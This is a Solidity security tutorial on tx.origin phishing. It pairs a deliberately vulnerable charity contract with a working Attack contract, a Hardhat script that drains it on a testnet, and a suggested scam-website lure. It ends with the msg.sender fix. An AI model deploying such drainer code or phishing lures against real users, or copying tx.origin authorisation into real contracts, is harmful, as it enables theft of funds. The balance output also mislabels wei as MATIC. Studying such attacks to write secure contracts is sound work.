# Phishing with tx.origin

So, we started with some security stuff in the last quest. How about we continue on? Come on, I know you like it. This will make you more confident writing on Polygon in a secure manner.

Now go ahead and setup a Polygon hardhat project as you already did many times in previous quests. Add your Alchemy key, two private keys, and everything!

So, phishing attacks, huh? A phishing attack (AKA tx.origin attack) is one of the simplest yet most dangerous ones in terms of damage. Yes, phishing can happen in the realm of smart contracts! Phishing attacks happen when an attacker deceives the owner of a contract making them call an _onlyOwner_ function. An _onlyOwner_ function is a function that can only be called by the owner (or that is how it is supposed to be). This kind of attack happens because the _tx.origin_ keyword is used. _tx.origin_ represents the transaction origin, this is different from _msg.sender_.
In a call chain like this A -> B -> C, the _msg.sender_ in C is B, but the _tx.origin_ is A. this leaves room for attackers.  Let’s find out how!

## Writing the Vulnerable contract:
Go into your _contracts_ directory and create a Vulnerable.sol.
Let’s consider the following case: Alice wrote and deployed a contract for charity. She can chip in MATICs to her contract, and she can call a function with a specific address to donate. Let’s have a look at the contract:

```js
// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

contract Vulnerable {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function withdraw(address payable _recipient) public {
        require(tx.origin == owner, "You are not the owner!");
        _recipient.transfer(address(this).balance);
    }

    receive() external payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

A standard contract, nothing really complicated. She deploys the contract, becomes the owner, and then sends her funds to a charity if she wants. Alice is such a nice person! But she made a mistake by using _tx.origin_ authentication. Now Bob decides to trick Alice, and he is a solidity expert. So Bob creates a contract called _Attack_, tricks her to call a function in his contract, which in turn calls the _withdraw_ function with his own address. Notice that Alice is _tx.origin_ in this chain: 
Alice -> Attack contract -> Vulnerable contract
Let’s see who Bob made this happen in his _Attack_ contract. Take a breath and let’s move on!

## Writing the Attack contract:
While you are in the _contracts_ directory, create an Attack.sol.
Let’s take a minute and think about how Bob could do this. He needs to deploy with _Vulnerable_'s address. Well, for the attack to succeed, Alice should interact with _Attack_ somehow. Let’s take a look at his contract:

```js
// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;
import "./Vulnerable.sol";

contract Attack {
    address payable owner;
    Vulnerable vulnerable;

    constructor(Vulnerable _vulnerable) {
        owner = payable(msg.sender);
        vulnerable = Vulnerable(_vulnerable);
    }

    function hack() public {
        vulnerable.withdraw(payable(address(this)));
    }

    receive() external payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

There are two ways Bob can hack Alice’s vulnerable contract, he can:

1 - Trick her to directly call _hack()_.

2 - Convince her to send ether to his _Attack_ contract.

Let’s think about how can he do it the first way. He can create a scam website and send the link to Alice. The website has one button with the text “Elon Musk is giving away ethers, click here to claim the reward”. You have seen such scams, right? The button is linked to _Attack.hack()_ so when she clicks, it is done. Or if poor Alice trusts malicious Bob, she can be convinced to send ethers to _Attack_, maybe she does not know that there is code in that address. Malicious Bob told her that this is his own address! Sending ethers to _Attack_ triggers the _receive() function_, which calls _Vulnerable.withdraw()_ with Bob’s address as a parameter. So, adding the line: 

```js 
vulnerable.withdraw(payable(address(this)));
```

to _receive()_ will also do.

## Attacking in Hardhat:
Create a scripts directory, create a js file, name it Attack.js. Let's simulate the attack.

```js
const { ethers } = require('hardhat')

const sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
}

hack = async () => {
    let Vulnerable, vulnerable, Attack, attack, signers, Alice, Bob, overrides, AliceBalance, BobBalance

    signers = await ethers.getSigners()
    Alice = signers[0]
    Bob = signers[1]

    console.log("I am poor Alice and I am deploying my vulnerable contract:")
    Vulnerable = await ethers.getContractFactory("Vulnerable")
    overrides = {
        value: ethers.utils.parseEther("0.000000001")
    }
    vulnerable = await Vulnerable.deploy(overrides)
    console.log("The vulnerable contract was deployed to " + vulnerable.address)
    console.log("-----------------------------------------------")

    console.log("I am malicious Bob and I am deploying my attack contract:")
    Attack = await ethers.getContractFactory("Attack")
    attack = await Attack.connect(Bob).deploy(vulnerable.address)
    console.log("The attack contract was deployed to " + attack.address)
    console.log("-----------------------------------------------")

    AliceBalance = await vulnerable.getBalance()
    BobBalance = await attack.getBalance()
    console.log("Alice has " + AliceBalance + " MATICs")
    console.log("Bob has " + BobBalance + " MATICs")
    console.log("-----------------------------------------------")

    console.log("Bob is about to hack(), he convinced Alice to call this function!")
    await attack.connect(Alice).hack()
    console.log("-----------------------------------------------")

    console.log("The hack is over:")
    await sleep(20000)
    AliceBalance = await vulnerable.getBalance()
    BobBalance = await attack.getBalance()
    console.log("Alice has " + AliceBalance + " MATICs")
    console.log("Bob has " + BobBalance + " MATICs")
}
hack()
```

Like we did in the previous reentrancy quest, right?
This scripts shows a possible scenario of the attack, feel free to play with it. Maybe trying hacking the second way, with _receive()_?

Now run
``` npx hardhat run Attack.js --network mumbai ```

You should get this, had you did everything the right way:

```
I am poor Alice and I am deploying my vulnerable contract:
The vulnerable contract was deployed to 0x0658AC49Ff407989492B1A9A66aC908B48f1F3b4
-----------------------------------------------
I am malicious Bob and I am deploying my attack contract:
The attack contract was deployed to 0x603a0d2E0D5ae85D3443D740EE255af4BDB54863
-----------------------------------------------
Alice has 1000000000 MATICs
Bob has 0 MATICs
-----------------------------------------------
Bob is about to hack(), he convinced Alice to call this function!
-----------------------------------------------
The hack is over:
Alice has 0 MATICs
Bob has 1000000000 MATICs
```

Ok, so how to prevent this kind of hacks?

## Final remarks:
In a scenario like the one we discussed, just use _msg.sender_ for authentication. _tx.origin_ should not be used for authorization. This does not mean that you should not use _tx.origin_ at all, there are some legitimate use cases. Like making sure no intermediate contracts are calling the current contract:

``` js
require(msg.sender == tx.origin); 
```

You can use that if you are worried about smart contracts calling your contract. 
Happy coding my friend!

